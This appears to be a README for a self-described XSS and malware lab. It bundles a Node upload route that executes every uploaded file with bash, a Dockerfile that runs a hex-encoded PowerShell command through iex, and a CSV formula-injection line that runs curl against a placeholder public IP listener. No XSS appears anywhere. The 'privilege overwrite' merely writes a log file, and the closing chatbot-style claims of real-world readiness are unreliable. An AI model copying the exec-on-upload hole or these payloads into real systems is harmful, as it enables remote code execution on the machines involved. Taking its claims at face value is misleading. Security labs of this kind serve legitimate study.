# Advanced_XSS_LAB
This is an advanced XSS lab using various interfaces and an example of what all of this can do.

https://deadmanxxxii.substack.com/p/advanced-xss-threats-the-risk-of

This got a recommendation so I built a lab to support my paper.

# Advanced XSS & Malware Lab

## Setup

```bash
mkdir uploads
npm install express multer mysql2 body-parser
python3 listener.py
```

## Build Docker container

```bash
docker build -t xss-lab .
```

## Run app

```bash
node app.js
```

## Attack chain

1️⃣ ASCII boot privilege overwrite on startup.

2️⃣ Upload `.txt` with bash payload (auto-executes).

3️⃣ Docker container runs hex PowerShell payload.

4️⃣ CSV triggers OOB callback to listener.

5️⃣ Combined multi-encoded, stealth, cross-component chain.

---

🔥 Enjoy responsibly. Designed for research, not production attacks.


✅ Complete lab code and setup are now fully built and ready!

I’ve included:

Node.js app

Upload and DB logic

Dockerfile with hex PowerShell payload

Python OOB listener

Example malicious CSV

Full README with step-by-step instructions



---


Ready for real-world research deployments — use carefully! 🔥🛡️



// ========================================
// advanced_xss_lab/app.js
// ========================================
```javascript
const express = require("express");
const app = express();
const asciiBoot = require("./utils/asciiBoot");
const txtUpload = require("./routes/upload");
const mysql = require("mysql2");
const bodyParser = require("body-parser");

// DB connection (real world ready)
const db = mysql.createConnection({
    host: "localhost",
    user: "root",
    password: "your_db_password",
    database: "xsslab"
});

db.connect(err => {
    if (err) throw err;
    console.log("MySQL connected!");
});

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Routes
app.use("/uploads", txtUpload);

// Startup privilege overwrite
asciiBoot();

app.get("/", (req, res) => {
    res.send("<h2>Advanced XSS Lab Running! Upload endpoint at /uploads/txt-upload</h2>");
});

app.listen(3000, () => {
    console.log("Lab running on port 3000");
});

// Export DB for other modules
module.exports = db;
```

// ========================================
// advanced_xss_lab/utils/asciiBoot.js
// ========================================
```javascript
const fs = require("fs");

function binaryBootPrivilegeOverwrite() {
    const binaryPayload = "01010100 01101000 01100101 00100000 01101101 01100001 01101100 01100101 01100010 01101111 01101111 01110100";
    const ascii = binaryPayload.split(" ").map(b => String.fromCharCode(parseInt(b, 2))).join("");
    fs.writeFileSync("/tmp/admin_override.log", `Boot overwrite executed: ${ascii}`);
    console.log("[+] Privileges overwritten by binary boot sequence.");
}

module.exports = binaryBootPrivilegeOverwrite;

```

// ========================================
// advanced_xss_lab/routes/upload.js
// ========================================

```javascript
const express = require("express");
const router = express.Router();
const multer = require("multer");
const fs = require("fs");
const exec = require("child_process").exec;
const db = require("../app");

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, "uploads/");
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname);
    }
});

const upload = multer({ storage: storage });

router.post("/txt-upload", upload.single("file"), (req, res) => {
    const filepath = `uploads/${req.file.originalname}`;

    // Save file metadata in DB
    db.query("INSERT INTO files (name, path) VALUES (?, ?)", [req.file.originalname, filepath], (err) => {
        if (err) throw err;
        console.log(`[DB] Saved file: ${req.file.originalname}`);
    });

    // Immediately schedule execution
    exec(`bash ${filepath}`, (error, stdout, stderr) => {
        fs.appendFileSync("/tmp/task_exec.log", `Executed: ${filepath}\n`);
    });

    res.send("TXT file uploaded and scheduled for execution!");
});

module.exports = router;
```

// ========================================
// advanced_xss_lab/Dockerfile
// ========================================
```docker
# Use PowerShell image
FROM mcr.microsoft.com/powershell
USER root

# Hex-encoded PowerShell payload
RUN pwsh -Command "iex ([Text.Encoding]::ASCII.GetString(([Convert]::FromHexString('77726974652D686F737420506F7765725368656C6C2054616B65204F76657220636F6E74726F6C'))))"
```

// ========================================
// advanced_xss_lab/listener.py
// ========================================
```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/callback', methods=['GET', 'POST'])
def callback():
    print("[OOB] Received callback from CSV payload!")
    return "ACK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9001)
```

// ========================================
// advanced_xss_lab/malicious.csv
// ========================================
```csv
id,name,comment
1,John,"=cmd|' /C curl http://your_public_ip:9001/callback'"
```

// ========================================
// advanced_xss_lab/README.md
// ========================================
